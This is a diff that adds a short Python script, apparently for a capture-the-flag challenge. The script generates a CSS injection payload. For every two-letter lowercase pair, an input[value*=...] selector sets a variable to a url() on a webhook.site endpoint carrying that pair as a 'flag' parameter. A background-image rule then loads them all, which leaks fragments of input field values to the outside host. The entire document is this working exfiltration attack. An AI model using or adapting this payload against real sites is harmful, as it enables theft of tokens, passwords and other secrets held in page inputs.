@@ -1,0 +1,16 @@
+import string
+
+result = ""
+for i in string.ascii_lowercase:
+    for j in string.ascii_lowercase:
+        result += 'input[value*="' + i + j + '"] {--' + i + j + ':url(https://webhook.site/6100aeb8-f1a4-481d-9027-8827d1c3b188?flag=' + i + j + ');}'
+
+result += "input{background-image:"
+
+for i in string.ascii_lowercase:
+    for j in string.ascii_lowercase:
+        result += 'var(--' + i + j + ',none),'
+
+result = result.strip(',')
+result += ";}"
+print(result)
